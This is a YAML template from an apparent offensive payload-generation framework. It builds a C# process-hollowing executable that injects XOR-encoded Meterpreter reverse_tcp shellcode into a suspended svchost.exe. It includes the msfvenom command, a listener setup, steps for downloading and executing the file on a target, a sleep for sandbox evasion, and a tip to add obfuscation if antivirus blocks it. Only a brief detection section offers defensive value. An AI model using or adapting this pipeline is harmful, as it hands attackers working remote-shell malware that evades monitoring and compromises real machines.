meta:
  name: "XOR Process Hollowing (C#)"
  category: "Process Injection"
  description: |
    Process hollowing technique that spawns svchost.exe in suspended state and overwrites its entrypoint with shellcode.
    
    Features:
    - XOR encryption for basic obfuscation (key: 0xfa)
    - 10-second sleep sandbox evasion
    - Spawns legitimate svchost.exe process
    - PEB parsing to locate entrypoint
    - Overwrites entrypoint with shellcode
    - Resumes execution to trigger payload
    
    This advanced technique creates a legitimate process in suspended state,
    parses its Process Environment Block (PEB) to find the entrypoint address,
    overwrites it with malicious shellcode, then resumes the thread.
    The process appears to be legitimate svchost.exe to simple monitoring tools.
    
    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055.012 - Process Injection: Process Hollowing"

  artifacts:
    - "svchost.exe process creation in suspended state"
    - "ZwQueryInformationProcess calls"
    - "ReadProcessMemory/WriteProcessMemory API calls"
    - "ResumeThread execution"
    - "Modified entrypoint in svchost.exe"
    - "10-second sleep before execution"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "hollowing.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C# byte array
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "csharp_payload"

output:
  type: "template"
  template: "process_hollowing/xor_hollowing.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
  launch_instructions: |
    C# XOR Process Hollowing - Launch Instructions

    Step 1: Start Metasploit Listener

    Start msfconsole and configure the handler:

    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Or manually in msfconsole:

    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST {{ lhost }}
    set LPORT {{ lport }}
    set ExitOnSession false
    exploit -j

    Step 2: Transfer Payload to Target

    Transfer the generated executable to the target Windows system:

    Using Python HTTP server:
    python3 -m http.server 8080

    On target (PowerShell):
    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"

    Step 3: Execute on Target

    Simply run the executable:
    {{ output_file }}

    Or via PowerShell:
    Start-Process {{ output_file }}

    Step 4: Verify Connection

    Check your Metasploit console for incoming session:
    Sending stage (200262 bytes) to [target_ip]
    Meterpreter session 1 opened

    Notes:

    - Encrypted with XOR key 0x{{ xor_key }}
    - Includes 10-second sleep for sandbox evasion
    - Spawns svchost.exe in suspended state (CREATE_SUSPENDED)
    - Parses PEB to locate executable entrypoint
    - Overwrites entrypoint with decoded shellcode
    - Resumes thread to execute payload
    - Process appears as legitimate svchost.exe
    - Requires x64 Windows system

    How It Works:

    1. Sleep 10 seconds to evade sandboxes that skip delays
    2. Spawn C:\Windows\System32\svchost.exe in suspended state
    3. Query process PEB (Process Environment Block) via ZwQueryInformationProcess
    4. Read PEB to get base executable address
    5. Parse PE header to find e_lfanew offset
    6. Calculate RVA (Relative Virtual Address) of entrypoint
    7. Get absolute entrypoint address
    8. XOR-decode shellcode
    9. Overwrite entrypoint with shellcode using WriteProcessMemory
    10. Resume thread with ResumeThread
    11. Shellcode executes as svchost.exe process

    Troubleshooting:

    - If no connection: Check firewall rules on attacker machine
    - If AV blocks: Consider additional obfuscation or packing
    - Payload waits 10 seconds before execution (sandbox evasion)
    - Requires x64 Windows system
    - svchost.exe must exist at C:\Windows\System32\svchost.exe

    Detection:

    This technique can be detected via:
    - Sysmon Event ID 1 (Process creation - svchost.exe from unusual parent)
    - Sysmon Event ID 8 (CreateRemoteThread)
    - Memory analysis showing RWX regions in svchost.exe
    - Behavioral analysis of svchost.exe making network connections
    - ZwQueryInformationProcess calls from non-system processes

    Cleanup:

    After testing, remove the payload:
    Remove-Item {{ output_file }} -Force
